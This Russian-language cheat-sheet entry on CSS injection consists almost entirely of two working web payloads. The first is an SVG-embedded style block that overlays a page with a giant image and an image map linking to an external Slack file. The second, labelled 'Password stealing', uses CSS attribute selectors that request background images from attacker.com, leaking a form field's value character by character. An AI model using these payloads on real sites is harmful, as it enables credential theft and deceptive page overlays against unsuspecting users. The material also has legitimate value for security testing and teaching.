# CSS injection

### CSSi в \<style>\</style>

```markup
<svg>
    <style>#slack-img {
        position: fixed !important;
        z-index: 999999 !important;
        opacity: 0.5 !important;
        margin-top: -5000px;
        left: 0;
    }
    </style>
</svg>
<img id="slack-img" src="https://files.slack.com/files-tmb/T02AVL3AF-FTAAY9170-4102b468c8/screenshot_2020-01-28_at_23.22.48_360.png" width="10000" height="10000" usemap="#slack-ma">
<map name="slack-map">
    <area shape="rect" coords="10000,10000 0,0" href="https://files.slack.com/files-pri/T02AVL3AF-FSVB2MXH8/re__html" target="_self">
</map>
```

### Чем вообще могут помочь инъекции в стили

#### Password stealing

```jsx
<style>
    #form2 input[value^='a'] { background-image:url(https://attacker.com/?a); }
    #form2 input[value^='b'] { background-image:url(https://attacker.com/?b); }
    #form2 input[value^='c'] { background-image:url(https://attacker.com/?c); }
     [...]
 </style>
 <form action="http://example.com" id="form2">
   <input type="text" id="secret" name="secret" value="abc">
 </form>
```
